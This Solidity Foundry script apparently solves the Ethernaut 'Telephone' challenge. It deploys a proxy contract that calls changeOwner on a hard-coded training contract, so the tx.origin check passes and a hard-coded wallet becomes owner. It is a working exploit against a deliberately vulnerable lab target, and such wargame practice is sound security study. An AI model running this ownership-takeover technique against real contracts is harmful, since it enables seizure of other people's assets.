// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/4_Telephone.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract ProxContract {
    // define my address in variable
    address constant me = 0x39b2079A4022823789FBA163Bb0EEc9020167E8c;

    // using this contract call changeOwner('myWallet address')
    constructor(Telephone _telephone) {
        _telephone.changeOwner(me);

        console2.log("New owner is me: ", _telephone.owner());
    }
}

contract TelephoneSolution is Script {

    Telephone public telephone = Telephone(0xc4ABAb2C172c1eeaC068f9A6863Df3f44E94616d);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // call contract above.
        new ProxContract(telephone);
        vm.stopBroadcast();
    }

}